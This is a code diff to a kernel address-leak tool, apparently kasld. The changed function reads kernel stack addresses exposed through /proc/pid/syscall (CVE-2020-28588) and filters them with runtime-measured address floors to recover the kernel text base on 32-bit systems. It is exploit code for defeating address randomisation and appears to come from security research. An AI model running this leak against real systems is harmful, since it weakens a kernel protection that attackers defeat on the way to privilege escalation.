@@ -54,6 +54,7 @@
 #define _GNU_SOURCE
 #include "include/kasld/api.h"
 #include "include/kasld/cli.h"
+#include "include/kasld/kernel_floor.h"
 #include <errno.h>
 #include <inttypes.h>
 #include <stdio.h>
@@ -144,23 +145,32 @@ static unsigned long get_kernel_addr_proc_pid_syscall(void) {
         unsigned long a = reg_addr >> 32;
         unsigned long b = reg_addr & 0xffffffff;
 
-        /* Use PAGE_OFFSET as lower bound rather than KERNEL_VIRT_TEXT_MIN.
-         * On 32-bit with 3G/1G split, KERNEL_VIRT_TEXT_MIN (0x40000000)
-         * overlaps user-space, causing user register values (SP, LR, mmap
-         * addresses) to be misidentified as kernel pointers. Kernel stack
-         * addresses leaked by CVE-2020-28588 are always >= PAGE_OFFSET. */
-        if (a < PAGE_OFFSET && b < PAGE_OFFSET)
+        /* Sort the two halves by the user/kernel boundary, not by
+         * KERNEL_VIRT_TEXT_MIN: on 32-bit with a 3G/1G split that floor
+         * (0x40000000) overlaps user space and would misread register values
+         * (SP, LR, mmap addresses) as kernel pointers. Kernel stack addresses
+         * leaked by CVE-2020-28588 are always at or above the boundary.
+         *
+         * MEASURED rather than the compile-time PAGE_OFFSET, which names this
+         * build's split and not the target's. On a kernel whose split sits
+         * lower, every genuine pointer in between falls under that constant and
+         * is dropped — silently, and indistinguishably from finding nothing.
+         * The measured value is also far tighter than the sound static
+         * alternative: PAGE_OFFSET_MIN is the same 0x40000000 this comment
+         * rejects. */
+        unsigned long floor = kasld_kernel_pointer_floor();
+        if (a < floor && b < floor)
           continue;
 
-        if (a >= PAGE_OFFSET && b >= PAGE_OFFSET) {
+        if (a >= floor && b >= floor) {
           if (a < b) {
             leaked_addr = a;
           } else {
             leaked_addr = b;
           }
-        } else if (a >= PAGE_OFFSET) {
+        } else if (a >= floor) {
           leaked_addr = a;
-        } else if (b >= PAGE_OFFSET) {
+        } else if (b >= floor) {
           leaked_addr = b;
         }
       } else {
@@ -170,15 +180,16 @@ static unsigned long get_kernel_addr_proc_pid_syscall(void) {
       if (!leaked_addr)
         continue;
 
-      /* Lower-bound floor: max(PAGE_OFFSET, KERNEL_VIRT_TEXT_MIN). The original
-       * code used PAGE_OFFSET alone (correct on 32-bit-with-VMSPLIT where
-       * PAGE_OFFSET > KERNEL_VIRT_TEXT_MIN) but admitted near-zero values on
-       * any arch where PAGE_OFFSET == 0 — s390 in particular. The arch gate
-       * above already prevents this component from compiling on 64-bit
-       * arches; the max() here is defence-in-depth so the validator stays
-       * sound even if the gate ever moves. */
-      unsigned long lo = PAGE_OFFSET > (unsigned long)KERNEL_VIRT_TEXT_MIN
-                             ? PAGE_OFFSET
+      /* Region floor for a REGION_KERNEL_TEXT emission: a text address sits at
+       * or above PAGE_OFFSET (the linear-map base), one module band above the
+       * user/kernel boundary filter 1 sorted by. kasld_page_offset_floor() is
+       * the MEASURED base snapped to the target's VMSPLIT, so a lower-split
+       * kernel's real _text (0x80008000 on a 2G build) is admitted where the
+       * compile-time PAGE_OFFSET would silently drop it. The max() with
+       * KERNEL_VIRT_TEXT_MIN is defence-in-depth against a zero floor. */
+      unsigned long po = kasld_page_offset_floor();
+      unsigned long lo = po > (unsigned long)KERNEL_VIRT_TEXT_MIN
+                             ? po
                              : (unsigned long)KERNEL_VIRT_TEXT_MIN;
       if (leaked_addr >= lo && leaked_addr <= KERNEL_VIRT_TEXT_MAX) {
         if (!addr || leaked_addr < addr)
